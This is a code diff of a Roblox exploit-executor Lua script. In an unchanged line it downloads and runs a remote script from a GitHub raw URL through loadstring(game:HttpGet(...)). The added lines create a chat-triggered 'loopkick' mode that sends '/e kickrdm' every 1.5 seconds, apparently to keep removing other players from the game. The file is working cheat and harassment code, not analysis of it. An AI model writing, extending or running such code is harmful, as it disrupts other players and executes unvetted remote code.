@@ -65,6 +65,8 @@ local function equipTool(tool)
     end
 end
 
+
+
 for _, player in ipairs(game.Players:GetPlayers()) do
     if player ~= game.Players.LocalPlayer then
         player.CharacterAdded:Connect(function(character)
@@ -119,3 +121,41 @@ if string.sub(message, 1, #keyword) == keyword then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/l11004/7yd7/main/cmde"))()
 end
 end)
+
+
+-- loop سكربتات
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e loopkick"
+if string.sub(message, 1, #keyword) == keyword then
+getgenv().loopkick = true
+
+  end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = "/e unloopkick"
+if string.sub(message, 1, #keyword) == keyword then
+getgenv().loopkick = false
+
+  end
+end)
+
+while wait(1.5) do
+ if getgenv().loopkick == true then
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer then
+            if player.Character and player.Character:FindFirstChildOfClass("Tool") then
+                local tool = player.Character:FindFirstChildOfClass("Tool")
+                if tool.Name == "MyTool" then
+                    getgenv().loopkick = false
+                end
+            end
+        end
+    end
+        game.Players:Chat("/e kickrdm")
+ 
+    end
+end
